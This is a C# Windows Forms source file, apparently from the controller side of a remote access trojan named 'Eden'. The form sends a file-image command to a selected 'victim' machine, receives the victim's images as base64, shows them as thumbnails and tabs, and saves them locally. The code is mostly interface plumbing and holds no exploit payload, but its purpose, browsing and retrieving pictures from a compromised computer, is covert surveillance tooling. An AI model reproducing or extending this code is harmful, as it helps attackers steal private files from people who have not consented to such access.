using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileImage : Form
    {
        public clsVictim m_victim { get; init; }
        public clsClient m_clnt { get { return m_victim.m_clnt; } }
        public string m_szVictimID { get { return m_victim.m_szID; } }
        public struct stImageItem
        {
            public string szFilename;
            public Image img;
        }
        private ImageList m_ImageList = new ImageList();
        public List<string> m_lsImgFilename { get; set; }

        public frmFileImage(clsVictim victim, List<string> lsImgFilename)
        {
            InitializeComponent();

            m_victim = victim;
            m_lsImgFilename = lsImgFilename;
            Text = @$"Image\\{victim.m_szID}";
        }

        private stImageItem fnGetItemTag(ListViewItem item) => (stImageItem)item.Tag;

        void Received(clsClient clnt, string szVictimID, List<string> aMsg)
        {
            if (aMsg[0] == "file")
            {
                if (aMsg[1] == "img")
                {
                    List<List<string>> lsResults = clsTools.EZData.String2TwoDList(aMsg[2]);
                    foreach (var result in lsResults)
                    {
                        string szImgFilename = result[0];
                        int nCode = int.Parse(result[1]);
                        string szMsg = result[2];

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            Image img = clsTools.Base64ToIamge(szMsg);
                            stImageItem st = new stImageItem()
                            {
                                szFilename = szImgFilename,
                                img = img,
                            };

                            ListViewItem item = new ListViewItem(szImgFilename.Split('/').Last());
                            item.Tag = st;
                            item.ImageKey = szImgFilename;

                            Invoke(new Action(() =>
                            {
                                m_ImageList.Images.Add(szImgFilename, img);
                                listView1.Items.Add(item);

                                toolStripProgressBar1.Increment(1);
                                toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}/{m_lsImgFilename.Count}]";
                            }));
                        }
                    }
                }
            }
        }



        void fnShowImage(string szFileName, Image img)
        {
            TabPage page = new TabPage(Path.GetFileName(szFileName));
            page.Tag = szFileName;
            tabControl1.TabPages.Add(page);

            PictureBox pb = new PictureBox();
            page.Controls.Add(pb);
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.Image = img;

            tabControl1.SelectedTab = page;
        }

        void setup()
        {
            m_clnt.ServerMessageReceived += Received;

            listView1.View = View.LargeIcon;
            listView1.LargeImageList = m_ImageList;
            listView1.MultiSelect = true;
            m_ImageList.ImageSize = new Size(255, 255);

            toolStripProgressBar1.Maximum = m_lsImgFilename.Count;
            toolStripStatusLabel1.Text = $"Image[0/{m_lsImgFilename.Count}] | Loading, please wait...";

            tabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            tabControl1.Padding = new Point(18, 4);
            tabControl1.ItemSize = new Size(0, 24);
            tabControl1.DrawItem += (s, e) =>
            {
                TabPage tab = tabControl1.TabPages[e.Index];
                Rectangle rect = tabControl1.GetTabRect(e.Index);

                TextRenderer.DrawText(
                    e.Graphics,
                    tab.Text,
                    tab.Font,
                    rect,
                    tab.ForeColor,
                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter
                );

                if (e.Index == 0)
                    return;

                Rectangle closeRect = new Rectangle(
                    rect.Right - 15,
                    rect.Top + 2,
                    12,
                    15
                );

                e.Graphics.DrawString("x", Font, Brushes.Black, closeRect);
            };
            tabControl1.MouseDown += (s, e) =>
            {
                if (tabControl1.SelectedIndex == 0)
                    return;

                for (int i = 0; i < tabControl1.TabPages.Count; i++)
                {
                    Rectangle tabRect = tabControl1.GetTabRect(i);
                    Rectangle closeRect = new Rectangle(
                        tabRect.Right - 15,
                        tabRect.Top + 4,
                        12,
                        12
                    );

                    if (closeRect.Contains(e.Location))
                    {
                        tabControl1.TabPages.RemoveAt(i);
                        break;
                    }
                }
            };

            m_clnt.SendVictim(m_szVictimID, "File|img|" + clsTools.EZData.OneDList2String(m_lsImgFilename));
        }

        void fnSaveMainPageImage()
        {
            List<stImageItem> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList().Select(x => fnGetItemTag(x)).ToList();
            if (lsImage.Count == 0)
                return;

            if (lsImage.Count == 1)
            {
                var img = lsImage[0].img;
                if (img == null)
                {
                    MessageBox.Show("Image object is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "Png file(*.png)|*.png";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        using (Bitmap bmp = new Bitmap(img))
                        {
                            bmp.Save(sfd.FileName, ImageFormat.Png);
                            MessageBox.Show("Save image successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                frmFileSaveImages f = new frmFileSaveImages(m_victim, lsImage);
                f.ShowDialog();
            }
        }

        void fnSaveOtherPageImage()
        {
            TabPage? page = tabControl1.SelectedTab;
            if (page == null)
                return;

            PictureBox pb = (PictureBox)page.Controls[0];
            if (pb == null)
                return;

            Image img = pb.Image;
            if (img == null)
                return;

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Png file(*.png)|*.png";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    using (Bitmap bmp = new Bitmap(img))
                    {
                        bmp.Save(sfd.FileName, ImageFormat.Png);
                        MessageBox.Show("Save image successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void frmFileImage_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmFileImage_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }

        //Image.SaveSelected
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
            {
                fnSaveMainPageImage();
            }
            else
            {
                fnSaveOtherPageImage();
            }
        }

        //Image.SaveAll
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            List<stImageItem> lsImage = listView1.Items.Cast<ListViewItem>().ToList().Select(x => fnGetItemTag(x)).ToList();
            if (lsImage.Count == 0)
                return;

            frmFileSaveImages f = new frmFileSaveImages(m_victim, lsImage);
            f.ShowDialog();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> lItem = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (lItem.Count == 0)
                return;

            var tag = fnGetItemTag(lItem.First());
            fnShowImage(tag.szFilename, tag.img);
        }

        //Image.ShowSelected
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList().ForEach(x => fnShowImage(x.szFilename, x.img));
        }
        //Image.ShowAll
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            listView1.Items.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList().ForEach(x => fnShowImage(x.szFilename, x.img));
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            List<TabPage> tabs = tabControl1.TabPages.Cast<TabPage>().ToList();
            for (int i = 0; i < tabs.Count; i++)
            {
                tabControl1.TabPages.Remove(tabs[i]);
            }
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
            {
                if (e.Modifiers == Keys.Control)
                {
                    if (e.KeyCode == Keys.S)
                    {
                        fnSaveMainPageImage();
                    }
                    else if (e.KeyCode == Keys.A)
                    {
                        listView1.Items.Cast<ListViewItem>().ToList().Select(x => x.Selected = true);
                    }
                }
            }
            else
            {
                if (e.Modifiers == Keys.Control)
                {
                    if (e.KeyCode == Keys.S)
                    {
                        fnSaveOtherPageImage();
                    }
                }
            }
        }
    }
}
